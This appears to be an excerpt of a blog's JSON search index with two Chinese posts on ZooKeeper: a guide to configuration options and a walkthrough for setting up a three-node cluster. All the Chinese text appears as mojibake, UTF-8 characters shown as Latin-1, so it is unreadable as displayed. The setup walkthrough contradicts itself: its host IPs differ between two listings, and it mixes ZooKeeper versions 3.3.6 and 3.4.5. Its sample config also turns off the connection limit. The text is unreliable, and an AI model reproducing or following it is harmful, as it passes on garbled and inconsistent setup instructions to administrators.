å°†ä¼šå¯¹å®¢æˆ·ç«¯è¿›è¡Œé™æµ, å³é™åˆ¶ç³»ç»Ÿä¸­æœªå¤„ç†çš„è¯·æ±‚æ•°é‡ä¸è¶…è¿‡ globalOutstandingLimit è®¾ç½®çš„å€¼ã€‚é»˜è®¤çš„é™åˆ¶æ˜¯ 1,000ã€‚ preAllocSizeå¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: zookeeper.preAllocSizeã€‚ ç”¨äºé…ç½® ZooKeeper äº‹åŠ¡æ—¥å¿—æ–‡ä»¶é¢„åˆ†é…çš„ç£ç›˜ç©ºé—´å¤§å°ã€‚é»˜è®¤çš„å—å¤§å°æ˜¯ 64Mã€‚æ”¹å˜å—å¤§å°çš„å…¶ä¸­ä¸€ä¸ªåŸå› æ˜¯å½“æ•°æ®å¿«ç…§æ–‡ä»¶ç”Ÿæˆæ¯”è¾ƒé¢‘ç¹æ—¶å¯ä»¥é€‚å½“å‡å°‘å—å¤§å°ã€‚æ¯”å¦‚ 1000 æ¬¡äº‹åŠ¡ä¼šæ–°äº§ç”Ÿä¸€ä¸ªå¿«ç…§(å‚æ•°ä¸ºsnapCount), æ–°äº§ç”Ÿå¿«ç…§åä¼šç”¨æ–°çš„äº‹åŠ¡æ—¥å¿—æ–‡ä»¶, å‡è®¾ä¸€ä¸ªäº‹åŠ¡ä¿¡æ¯å¤§å°100b, é‚£ä¹ˆäº‹åŠ¡æ—¥å¿—é¢„åˆ†é…çš„ç£ç›˜ç©ºé—´å¤§å°ä¸º100kbä¼šæ¯”è¾ƒå¥½ã€‚ snapCountå¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: zookeeper.snapCountã€‚ ZooKeeper å°†äº‹åŠ¡è®°å½•åˆ°äº‹åŠ¡æ—¥å¿—ä¸­ã€‚å½“ snapCount ä¸ªäº‹åŠ¡è¢«å†™åˆ°ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶å, å¯åŠ¨ä¸€ä¸ªå¿«ç…§å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„äº‹åŠ¡æ—¥å¿—æ–‡ä»¶ã€‚snapCount çš„é»˜è®¤å€¼æ˜¯ 100,000ã€‚ traceFileå¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: requestTraceFileã€‚ å¦‚æœå®šä¹‰äº†è¯¥é€‰é¡¹, é‚£ä¹ˆè¯·æ±‚å°†ä¼šè®°å½•åˆ°ä¸€ä¸ªåä¸º traceFile.year.month.day çš„è·Ÿè¸ªæ–‡ä»¶ä¸­ã€‚ä½¿ç”¨è¯¥é€‰é¡¹å¯ä»¥æä¾›å¾ˆæœ‰ç”¨çš„è°ƒè¯•ä¿¡æ¯, ä½†æ˜¯ä¼šå½±å“æ€§èƒ½ã€‚ æ³¨æ„: requestTraceFile è¿™ä¸ªç³»ç»Ÿå±æ€§æ²¡æœ‰ zookeeper å‰ç¼€, å¹¶ä¸”é…ç½®çš„å˜é‡åç§°å’Œç³»ç»Ÿå±æ€§ä¸ä¸€æ ·ã€‚ maxClientCnxnsæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ åœ¨ socket çº§åˆ«é™åˆ¶å•ä¸ªå®¢æˆ·ç«¯åˆ° ZooKeeper é›†ç¾¤ä¸­å•å°æœåŠ¡å™¨çš„å¹¶å‘è¿æ¥æ•°é‡, å¯ä»¥é€šè¿‡ IP åœ°å€æ¥åŒºåˆ†ä¸åŒçš„å®¢æˆ·ç«¯ã€‚å®ƒç”¨æ¥é˜»æ­¢æŸç§ç±»å‹çš„ DoS æ”»å‡», åŒ…æ‹¬æ–‡ä»¶æè¿°ç¬¦èµ„æºè€—å°½ã€‚é»˜è®¤å€¼æ˜¯ 60ã€‚å°†å€¼è®¾ç½®ä¸º 0 å°†å®Œå…¨ç§»é™¤å¹¶å‘è¿æ¥çš„é™åˆ¶ã€‚ clientPortAddressæœåŠ¡å™¨ç›‘å¬å®¢æˆ·ç«¯è¿æ¥çš„åœ°å€ (ipv4, ipv6 æˆ– ä¸»æœºå) , äº¦å³å®¢æˆ·ç«¯å°è¯•è¿æ¥åˆ°æœåŠ¡å™¨ä¸Šçš„åœ°å€ã€‚è¯¥å‚æ•°æ˜¯å¯é€‰çš„, é»˜è®¤æˆ‘ä»¬ä»¥è¿™æ ·ä¸€ç§æ–¹å¼ç»‘å®š, å³å¯¹äºæœåŠ¡å™¨ä¸Šä»»æ„ address/interface/nic, ä»»ä½•è¿æ¥åˆ° clientPort çš„è¯·æ±‚å°†ä¼šè¢«æ¥å—ã€‚ minSessionTimeoutæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ æœåŠ¡å™¨å…è®¸å®¢æˆ·ç«¯ä¼šè¯çš„æœ€å°è¶…æ—¶æ—¶é—´, ä»¥æ¯«ç§’ä¸ºå•ä½ã€‚é»˜è®¤å€¼æ˜¯ 2 å€çš„ tickTimeã€‚ maxSessionTimeoutæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ æœåŠ¡å™¨å…è®¸å®¢æˆ·ç«¯ä¼šè¯çš„æœ€å¤§è¶…æ—¶æ—¶é—´, ä»¥æ¯«ç§’ä¸ºå•ä½ã€‚é»˜è®¤å€¼æ˜¯ 20 å€çš„ tickTimeã€‚ fsync.warningthresholdmså¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: fsync.warningthresholdmsã€‚ ç”¨äºé…ç½® ZooKeeper è¿›è¡Œäº‹åŠ¡æ—¥å¿— (WAL) fsync æ“ä½œæ¶ˆè€—æ—¶é—´çš„æŠ¥è­¦é˜ˆå€¼, ä¸€æ—¦è¶…è¿‡è¿™ä¸ªé˜ˆå€¼å°†ä¼šæ‰“å°è¾“å‡ºæŠ¥è­¦æ—¥å¿—ã€‚è¯¥å‚æ•°çš„é»˜è®¤å€¼æ˜¯ 1000, ä»¥æ¯«ç§’ä¸ºå•ä½ã€‚å‚æ•°å€¼åªèƒ½ä½œä¸ºç³»ç»Ÿå±æ€§æ¥è®¾ç½®ã€‚ autopurge.snapRetainCountæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ã€‚ å½“å¯ç”¨è‡ªåŠ¨æ¸…ç†åŠŸèƒ½å, ZooKeeper å°†åªä¿ç•™ autopurge.snapRetainCount ä¸ªæœ€è¿‘çš„æ•°æ®å¿«ç…§(dataDir)å’Œå¯¹åº”çš„äº‹åŠ¡æ—¥å¿—æ–‡ä»¶(dataLogDir), å…¶ä½™çš„å°†ä¼šåˆ é™¤æ‰ã€‚é»˜è®¤å€¼æ˜¯ 3ã€‚æœ€å°å€¼ä¹Ÿæ˜¯ 3ã€‚ autopurge.purgeIntervalæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ã€‚ ç”¨äºé…ç½®è§¦å‘æ¸…ç†ä»»åŠ¡çš„æ—¶é—´é—´éš”, ä»¥å°æ—¶ä¸ºå•ä½ã€‚è¦å¯ç”¨è‡ªåŠ¨æ¸…ç†, å¯ä»¥å°†å…¶å€¼è®¾ç½®ä¸ºä¸€ä¸ªæ­£æ•´æ•° (å¤§äº 1) ã€‚é»˜è®¤å€¼æ˜¯ 0ã€‚ syncEnabledå¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: zookeeper.observer.syncEnabledã€‚ å’Œå‚ä¸è€…ä¸€æ ·, è§‚å¯Ÿè€…ç°åœ¨é»˜è®¤å°†äº‹åŠ¡æ—¥å¿—ä»¥åŠæ•°æ®å¿«ç…§å†™åˆ°ç£ç›˜ä¸Š, è¿™å°†å‡å°‘è§‚å¯Ÿè€…åœ¨æœåŠ¡å™¨é‡å¯æ—¶çš„æ¢å¤æ—¶é—´ã€‚å°†å…¶å€¼è®¾ç½®ä¸º â€œfalseâ€ å¯ä»¥ç¦ç”¨è¯¥ç‰¹æ€§ã€‚é»˜è®¤å€¼æ˜¯ â€œtrueâ€ã€‚ é›†ç¾¤é…ç½®é€‰é¡¹ æœ¬èŠ‚ä¸­çš„é€‰é¡¹ä¸»è¦ç”¨äºZooKeeperé›†ç¾¤ã€‚ electionAlgæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ã€‚ ç”¨äºé€‰æ‹©ä½¿ç”¨çš„ leader é€‰ä¸¾ç®—æ³•ã€‚â€0â€ å¯¹åº”äºåŸå§‹çš„åŸºäº UDP çš„ç‰ˆæœ¬, â€œ1â€ å¯¹åº”äºå¿«é€Ÿ leader é€‰ä¸¾åŸºäºUDPçš„æ— èº«ä»½éªŒè¯çš„ç‰ˆæœ¬, â€œ2â€ å¯¹åº”äºå¿«é€Ÿ leader é€‰ä¸¾æœ‰åŸºäºUDPçš„èº«ä»½éªŒè¯çš„ç‰ˆæœ¬, è€Œ â€œ3â€ å¯¹åº”äºå¿«é€Ÿ leader é€‰ä¸¾åŸºäºTCPçš„ç‰ˆæœ¬ã€‚ç›®å‰é»˜è®¤å€¼æ˜¯ç®—æ³• 3ã€‚ æ³¨æ„: leader é€‰ä¸¾ 0, 1, 2 è¿™ä¸‰ç§å®ç°å·²ç»åºŸå¼ƒ, åœ¨æ¥ä¸‹æ¥çš„ç‰ˆæœ¬ä¸­å°†ä¼šç§»é™¤å®ƒä»¬, è¿™æ ·å°±åªå‰©ä¸‹ FastLeaderElection ç®—æ³•ã€‚ initLimitæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ã€‚ é»˜è®¤å€¼æ˜¯ 10, å³ tickTime å±æ€§å€¼çš„ 10 å€ã€‚å®ƒç”¨äºé…ç½®å…è®¸ followers è¿æ¥å¹¶åŒæ­¥åˆ° leader çš„æœ€å¤§æ—¶é—´ã€‚å¦‚æœ ZooKeeper ç®¡ç†çš„æ•°æ®é‡å¾ˆå¤§çš„è¯å¯ä»¥å¢åŠ è¿™ä¸ªå€¼ã€‚ leaderServeså¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: zookeeper.leaderServesã€‚ ç”¨äºé…ç½® Leader æ˜¯å¦æ¥å—å®¢æˆ·ç«¯è¿æ¥, é»˜è®¤å€¼æ˜¯ â€œyesâ€, å³ leader å°†ä¼šæ¥å—å®¢æˆ·ç«¯è¿æ¥ã€‚åœ¨ ZooKeeper ä¸­, leader æœåŠ¡å™¨ä¸»è¦åè°ƒäº‹åŠ¡æ›´æ–°è¯·æ±‚ã€‚å¯¹äºäº‹åŠ¡æ›´æ–°è¯·æ±‚ååå¾ˆé«˜è€Œè¯»å–è¯·æ±‚ååå¾ˆä½çš„æƒ…å†µå¯ä»¥é…ç½® leader ä¸æ¥å—å®¢æˆ·ç«¯è¿æ¥, è¿™æ ·å°±å¯ä»¥ä¸“æ³¨äºåè°ƒå·¥ä½œã€‚ æ³¨æ„: å½“ ZooKeeper é›†ç¾¤ä¸­æœåŠ¡å™¨çš„æ•°é‡è¶…è¿‡ 3 ä¸ªæ—¶, å»ºè®®å¼€å¯ leader é€‰ä¸¾ã€‚ server.x=[hostname]:nnnnn:nnnnnæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ã€‚ ç»„æˆ ZooKeeper é›†ç¾¤çš„æœåŠ¡å™¨ã€‚å½“æœåŠ¡å™¨å¯åŠ¨æ—¶, å¯ä»¥é€šè¿‡æŸ¥æ‰¾æ•°æ®ç›®å½•ä¸­çš„ myid æ–‡ä»¶æ¥å†³å®šå®ƒæ˜¯å“ªä¸€å°æœåŠ¡å™¨ã€‚myid æ–‡ä»¶åŒ…å«æœåŠ¡å™¨ç¼–å·, å¹¶ä¸”å®ƒè¦åŒ¹é… â€œserver.xâ€ ä¸­çš„ xã€‚ å®¢æˆ·ç«¯ç”¨æ¥ç»„æˆ ZooKeeper é›†ç¾¤çš„æœåŠ¡å™¨åˆ—è¡¨å¿…é¡»å’Œæ¯ä¸ª ZooKeeper æœåŠ¡å™¨ä¸­é…ç½®çš„ ZooKeeper æœåŠ¡å™¨åˆ—è¡¨ç›¸åŒ¹é…ã€‚ æœ‰ä¸¤ä¸ªç«¯å£å· nnnnn, ç¬¬ä¸€ä¸ªæ˜¯ followers ç”¨æ¥è¿æ¥åˆ° leader, ç¬¬äºŒä¸ªæ˜¯ç”¨äº leader é€‰ä¸¾ã€‚å¦‚æœæƒ³åœ¨å•å°æœºå™¨ä¸Šæµ‹è¯•å¤šä¸ªæœåŠ¡, åˆ™å¯ä»¥ä¸ºæ¯ä¸ªæœåŠ¡é…ç½®ä¸åŒçš„ç«¯å£ã€‚ syncLimitæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ã€‚ é»˜è®¤å€¼æ˜¯ 5, å³ tickTime å±æ€§å€¼çš„ 5 å€ã€‚å®ƒç”¨äºé…ç½®leader å’Œ followers é—´è¿›è¡Œå¿ƒè·³æ£€æµ‹çš„æœ€å¤§å»¶è¿Ÿæ—¶é—´ã€‚å¦‚æœåœ¨è®¾ç½®çš„æ—¶é—´å†… followers æ— æ³•ä¸ leader è¿›è¡Œé€šä¿¡, é‚£ä¹ˆ followers å°†ä¼šè¢«ä¸¢å¼ƒã€‚ group.x=nnnnn[:nnnnn]æ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ã€‚ Enables a hierarchical quorum construction.â€xâ€ æ˜¯ä¸€ä¸ªç»„çš„æ ‡è¯†, ç­‰å·å³è¾¹çš„æ•°å­—å¯¹åº”äºæœåŠ¡å™¨çš„æ ‡è¯†. èµ‹å€¼æ“ä½œå³è¾¹æ˜¯å†’å·åˆ†éš”çš„æœåŠ¡å™¨æ ‡è¯†ã€‚æ³¨æ„: ç»„å¿…é¡»æ˜¯ä¸ç›¸äº¤çš„, å¹¶ä¸”æ‰€æœ‰ç»„è”åˆåå¿…é¡»æ˜¯ ZooKeeper é›†ç¾¤ã€‚ weight.x=nnnnnæ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ã€‚ å’Œ â€œgroupâ€ ä¸€èµ·ä½¿ç”¨, å½“å½¢æˆé›†ç¾¤æ—¶å®ƒç»™æ¯ä¸ªæœåŠ¡å™¨èµ‹æƒé‡å€¼ã€‚è¿™ä¸ªå€¼å¯¹åº”äºæŠ•ç¥¨æ—¶æœåŠ¡å™¨çš„æƒé‡ã€‚ZooKeeper ä¸­åªæœ‰å°‘æ•°éƒ¨åˆ†éœ€è¦æŠ•ç¥¨, æ¯”å¦‚ leader é€‰ä¸¾ä»¥åŠåŸå­çš„å¹¿æ’­åè®®ã€‚æœåŠ¡å™¨æƒé‡çš„é»˜è®¤å€¼æ˜¯ 1ã€‚å¦‚æœé…ç½®æ–‡ä»¶ä¸­å®šä¹‰äº†ç»„, ä½†æ˜¯æ²¡æœ‰æƒé‡, é‚£ä¹ˆæ‰€æœ‰æœåŠ¡å™¨çš„æƒé‡å°†ä¼šèµ‹å€¼ä¸º 1ã€‚ cnxTimeoutå¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: zookeeper.cnxTimeoutã€‚ ç”¨äºé…ç½® leaderé€‰ä¸¾è¿‡ç¨‹ä¸­ï¼Œæ‰“å¼€ä¸€æ¬¡è¿æ¥ï¼ˆé€‰ä¸¾çš„ server äº’ç›¸é€šä¿¡å»ºç«‹è¿æ¥ï¼‰çš„è¶…æ—¶æ—¶é—´ã€‚é»˜è®¤å€¼æ˜¯ 5sã€‚ èº«ä»½è®¤è¯å’Œæˆæƒé€‰é¡¹æœ¬èŠ‚çš„é€‰é¡¹å…è®¸é€šè¿‡èº«ä»½è®¤è¯å’Œæˆæƒæ¥æ§åˆ¶æœåŠ¡æ‰§è¡Œã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647zookeeper.DigestAuthenticationProvider.superDigestå¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: zookeeper.DigestAuthenticationProvider.superDigestè¯¥åŠŸèƒ½é»˜è®¤æ˜¯ç¦ç”¨çš„ã€‚èƒ½å¤Ÿä½¿ ZooKeeper é›†ç¾¤ç®¡ç†å‘˜å¯ä»¥ä½œä¸ºä¸€ä¸ª \"super\" ç”¨æˆ·æ¥è®¿é—® znode å±‚çº§ç»“æ„ã€‚ç‰¹åˆ«æ˜¯å¯¹äºä¸€ä¸ªå·²ç»è®¤è¯ä¸ºè¶…çº§ç®¡ç†å‘˜çš„ç”¨æˆ·ä¸éœ€è¦ ACL æ£€æŸ¥ã€‚org.apache.zookeeper.server.auth.DigestAuthenticationProvider å¯ä»¥ç”¨æ¥ç”Ÿæˆ superDigest, è°ƒç”¨å®ƒå¸¦æœ‰ \"super:&lt;password&gt;\" å‚æ•°çš„æ–¹æ³•ã€‚å½“å¯åŠ¨é›†ç¾¤ä¸­çš„æ¯å°æœåŠ¡å™¨æ—¶, å°†ç”Ÿæˆçš„ \"super:&lt;data&gt;\" ä½œä¸ºç³»ç»Ÿå±æ€§æä¾›ã€‚å½“ ZooKeeper å®¢æˆ·ç«¯å‘ ZooKeeper æœåŠ¡å™¨è¿›è¡Œèº«ä»½è®¤è¯æ—¶, ä¼šä¼ é€’ä¸€ä¸ª \"digest\" å’Œ \"super:&lt;password&gt;\" çš„è®¤è¯æ•°æ®. æ³¨æ„æ‘˜è¦å¼èº«ä»½éªŒè¯å°†è®¤è¯æ•°æ®ä»¥æ™®é€šæ–‡æœ¬çš„å½¢å¼ä¼ é€’ç»™æœåŠ¡å™¨, åœ¨ç½‘ç»œä¸­éœ€è¦è°¨æ…ä½¿ç”¨è¯¥è®¤è¯æ–¹æ³•, è¦ä¹ˆåªåœ¨æœ¬æœºä¸Šæˆ–é€šè¿‡ä¸€ä¸ªåŠ å¯†çš„è¿æ¥ã€‚### å®éªŒæ€§é€‰é¡¹/ç‰¹æ€§æœ¬èŠ‚åˆ—ä¸¾äº†ä¸€äº›ç›®å‰è¿˜å¤„äºå®éªŒé˜¶æ®µçš„æ–°ç‰¹æ€§ã€‚### æœåŠ¡å™¨åªè¯»æ¨¡å¼å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: readonlymode.enabledã€‚å°†å…¶è®¾ç½®ä¸º true å°†ä¼šå¯ç”¨æœåŠ¡å™¨åªè¯»æ¨¡å¼æ”¯æŒ, é»˜è®¤æ˜¯ç¦ç”¨çš„ã€‚ROM å…è®¸è¯·æ±‚äº† ROM æ”¯æŒçš„å®¢æˆ·ç«¯ä¼šè¯è¿æ¥åˆ°æœåŠ¡å™¨, å³ä½¿å½“æœåŠ¡å™¨å¯èƒ½å·²ç»ä»é›†ç¾¤ä¸­åˆ†éš”å‡ºå»ã€‚åœ¨è¯¥æ¨¡å¼ä¸­, ROM å®¢æˆ·ç«¯ä»ç„¶å¯ä»¥ä» ZK æœåŠ¡ä¸­è¯»å–å€¼, ä½†æ˜¯ä¸èƒ½è¿›è¡Œå†™æ“ä½œä»¥åŠçœ‹è§å…¶å®ƒå®¢æˆ·ç«¯æ‰€åšçš„ä¸€äº›å˜æ›´ã€‚æ›´å¤šè¯¦ç»†ä¿¡æ¯å¯ä»¥å‚è§ ZOOKEEPER-784 è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚### ä¸å®‰å…¨çš„é€‰é¡¹ä¸‹é¢çš„é€‰é¡¹ä¼šå¾ˆæœ‰ç”¨, ä½†æ˜¯ä½¿ç”¨çš„æ—¶å€™éœ€è¦ç‰¹åˆ«å°å¿ƒã€‚### forceSyncå¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: zookeeper.forceSyncã€‚ç”¨äºé…ç½®æ˜¯å¦éœ€è¦åœ¨äº‹åŠ¡æ—¥å¿—æäº¤çš„æ—¶å€™è°ƒç”¨ FileChannel.force æ¥ä¿è¯æ•°æ®å®Œå…¨åŒæ­¥åˆ°ç£ç›˜ã€‚é»˜è®¤å€¼æ˜¯ \"yes\"ã€‚å¦‚æœè¯¥é€‰é¡¹è®¾ç½®ä¸º \"no\", ZooKeeper å°†ä¸ä¼šå¼ºåˆ¶åŒæ­¥äº‹åŠ¡æ›´æ–°æ—¥å¿—åˆ°ç£ç›˜ã€‚### jute.maxbuffer:å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: jute.maxbufferã€‚æ²¡æœ‰ zookeeper å‰ç¼€ã€‚ç”¨äºæŒ‡å®šä¸€ä¸ª znode ä¸­å¯ä»¥å­˜å‚¨æ•°æ®é‡çš„æœ€å¤§å€¼, é»˜è®¤å€¼æ˜¯ 0xfffff, æˆ– 1M å†…ã€‚å¦‚æœè¿™ä¸ªé€‰é¡¹æ”¹å˜äº†, é‚£ä¹ˆè¯¥ç³»ç»Ÿå±æ€§å¿…é¡»åœ¨æ‰€æœ‰çš„æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯è¿›è¡Œè®¾ç½®, å¦åˆ™ä¼šå‡ºç°é—®é¢˜ã€‚ZooKeeperæ—¨åœ¨å­˜å‚¨å¤§å°ä¸ºåƒå­—èŠ‚æ•°é‡çš„æ•°æ®ã€‚### skipACLå¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: zookeeper.skipACLã€‚ç”¨äºé…ç½® ZooKeeper æœåŠ¡å™¨è·³è¿‡ ACL æƒé™æ£€æŸ¥ã€‚è¿™å°†ä¸€å®šç¨‹åº¦çš„æé«˜æœåŠ¡å™¨ååé‡, ä½†æ˜¯ä¹Ÿå‘æ‰€æœ‰å®¢æˆ·ç«¯å®Œå…¨å¼€æ”¾æ•°æ®è®¿é—®ã€‚### quorumListenOnAllIPså½“è®¾ç½®ä¸º true æ—¶, ZooKeeper æœåŠ¡å™¨å°†ä¼šåœ¨æ‰€æœ‰å¯ç”¨çš„ IP åœ°å€ä¸Šç›‘å¬æ¥è‡ªå…¶å¯¹ç­‰ç‚¹çš„è¿æ¥è¯·æ±‚, è€Œä¸ä»…æ˜¯é…ç½®æ–‡ä»¶çš„æœåŠ¡å™¨åˆ—è¡¨ä¸­é…ç½®çš„åœ°å€ã€‚å®ƒä¼šå½±å“å¤„ç† ZAB åè®®å’Œ Fast Leader Election åè®®çš„è¿æ¥ã€‚é»˜è®¤å€¼æ˜¯ falseã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/05/27/Bigdata-hadoop/zookeeper/Bigdata-ZooKeeperçš„é…ç½®è¯¦è§£ä¼˜åŒ–/"},{"title":"Bigdata-ZooKeeperé›†ç¾¤å¿«é€Ÿæ­å»ºé…ç½®ä¸æ‰©å®¹","text":"ZooKeeperé›†ç¾¤å¿«é€Ÿæ­å»ºä¹‹å‰æè¿‡äº†hadoopå’Œsparkï¼Œhueï¼Œç°åœ¨ä½¿ç”¨kafkaé›†ç¾¤ç»“åˆzookeeperé›†ç¾¤åšæ•°æ®æ¶ˆè´¹å¤„ç†ï¼Œæœ¬æ–‡æ˜¯ZooKeeperçš„å¿«é€Ÿæ­å»º,æ—¨åœ¨å¸®åŠ©å¤§å®¶ä»¥æœ€å¿«çš„é€Ÿåº¦å®Œæˆä¸€ä¸ªZKé›†ç¾¤çš„æ­å»º,ä»¥ä¾¿å¼€å±•å…¶å®ƒå·¥ä½œã€‚ é›†ç¾¤ï¼šæœ¬æ–‡ä½¿ç”¨äº†3å°æœºå™¨éƒ¨ç½²ZooKeeperé›†ç¾¤ï¼ŒIPå’Œä¸»æœºåå¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š 1234IP ä¸»æœºå169.44.62.11 zk1.jollychic.com 169.44.59.12 zk2.jollychic.com169.44.62.13 zk3.jollychic.com å®‰è£…è¯´æ˜Zookeeperæœºå™¨é—´ä¸éœ€è¦è®¾ç½®å…å¯†ç ç™»å½•ï¼Œå…¶å®ƒhadoopä¹Ÿå¯ä»¥ä¸è®¾ç½®ï¼Œåªè¦ä¸ä½¿ç”¨hadoop-daemons.shæ¥å¯åŠ¨ã€åœæ­¢è¿›ç¨‹ï¼Œæ³¨æ„ä¸æ˜¯hadoop-daemon.shï¼Œè€Œæ˜¯å¸¦â€œsâ€çš„é‚£ä¸ªï¼Œå¸¦â€œsâ€çš„ä¼šè¯»å–hadoopçš„salvesæ–‡ä»¶ï¼Œè¿œç¨‹sshå¯åŠ¨DataNodeå’Œå¤‡NameNodeç­‰ã€‚ é…ç½®/etc/hostså°†3å°æœºå™¨çš„IPå’Œä¸»æœºåæ˜ å°„å…³ç³»ï¼Œåœ¨3å°æœºå™¨ä¸Šéƒ½é…ç½®ä¸€ä¸‹ï¼Œäº¦å³åœ¨3å°æœºå™¨çš„/etc/hostsæ–‡ä»¶ä¸­ï¼Œå‡å¢åŠ ä»¥ä¸‹å†…å®¹ï¼ˆå¯ä»¥å…ˆé…ç½®å¥½ä¸€å°ï¼Œç„¶åé€šè¿‡scpç­‰å‘½ä»¤å¤åˆ¶åˆ°å…¶å®ƒæœºå™¨ä¸Šï¼Œæ³¨æ„ä¸»æœºåä¸èƒ½åŒ…å«ä»»ä½•ä¸‹åˆ’çº¿ï¼‰ï¼š 1234127.0.0.1 localhost.localdomain localhost169.44.62.12 zk1.jollychic.com169.44.59.13 zk2.jollychic.com169.44.62.14 zk3.jollychic.com Step1:é…ç½®JAVAç¯å¢ƒã€‚æ£€éªŒæ–¹æ³•:æ‰§è¡Œ java â€“version å’Œ javac â€“version å‘½ä»¤ã€‚ä¸‹è½½å¹¶è§£å‹ zookeeperã€‚é“¾æ¥ä¸€ ï¼Œé“¾æ¥äºŒ (æ›´å¤šç‰ˆæœ¬:http://dwz.cn/37HGI) Step2:12345671.zookeeperçš„ç¯å¢ƒå˜é‡çš„é…ç½®ï¼šä¸ºäº†ä»Šåæ“ä½œæ–¹ä¾¿ï¼Œæˆ‘ä»¬éœ€è¦å¯¹Zookeeperçš„ç¯å¢ƒå˜é‡è¿›è¡Œé…ç½®ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼šåœ¨/etc/profile.d/zk.shæ–‡ä»¶ä¸­åŠ å…¥å¦‚ä¸‹çš„å†…å®¹ï¼š#set zookeeper environmentexport ZOOKEEPER_HOME=/data/tools/zookeeper-3.4.5export PATH=$PATH:$ZOOKEEPER_HOME/bin:$ZOOKEEPER_HOME/conf Step3:12345678910112.ä¸‹è½½ä»¥åè§£å‹åˆ°æˆ‘è‡ªå·±æ–°å»ºçš„ï¼š[hadoop@namenode ~]$ tar -zxvf zookeeper-3.3.6.tar.gz -C /srv/hadoop/[hadoop@namenode ]$ cd /srv/hadoop/zookeeper-3.3.6/conf/### å°†zoo_sample.cfgæ‹·è´ä¸€ä»½å‘½åä¸ºzoo.cfg,è¿™é‡Œæˆ‘æ‹·è´ä¸€ä»½å‘½åä¸ºï¼šzoo.cfg[hadoop@namenode conf]$ cp -r zoo_sample.cfg zoo.cfg### è¿™é‡Œå…ˆåˆ›å»º/dataå’Œ/logs è¿™ä¸¤ä¸ªç›®å½•ã€‚mkdir -p /data/tools/zookeeper-3.4.5/zookeeper/datamkdir -p /data/tools/zookeeper-3.4.5/zookeeper/logs æ³¨æ„ä¸Šå›¾çš„é…ç½®ä¸­masterï¼Œslave1åˆ†åˆ«ä¸ºä¸»æœºåã€‚ åœ¨ä¸Šé¢çš„é…ç½®æ–‡ä»¶ä¸­&quot;server.id=host:port:port&quot;ä¸­çš„ç¬¬ä¸€ä¸ªportæ˜¯ä»æœºå™¨ï¼ˆfollowerï¼‰è¿æ¥åˆ°ä¸»æœºå™¨ï¼ˆleaderï¼‰çš„ç«¯å£å·ï¼Œç¬¬äºŒä¸ªportæ˜¯è¿›è¡Œleadershipé€‰ä¸¾çš„ç«¯å£å·ã€‚ ä¿®æ”¹é…ç½®ï¼šzoo.cfgä¿®æ”¹æœ‰çš„é»˜è®¤å­˜åœ¨ï¼Œæ·»åŠ çº¢è‰²çš„å†…å®¹ï¼š 1234567891011tickTime=2000clientPort=2181initLimit=10syncLimit=5maxClientCnxns=0 #è¿™ä¸ªæ˜¯è®¾ç½®è¿æ¥æ•°0æ²¡æœ‰åšé™åˆ¶dataDir=/data/tools/zookeeper-3.4.5/zookeeper/datadataLogDir=/data/tools/zookeeper-3.4.5/zookeeper/logsserver.0=zk1.jollychic.com:2888:3888server.1=zk2.jollychic.com:2888:3888server.2=zk3.jollychic.com:2888:3888 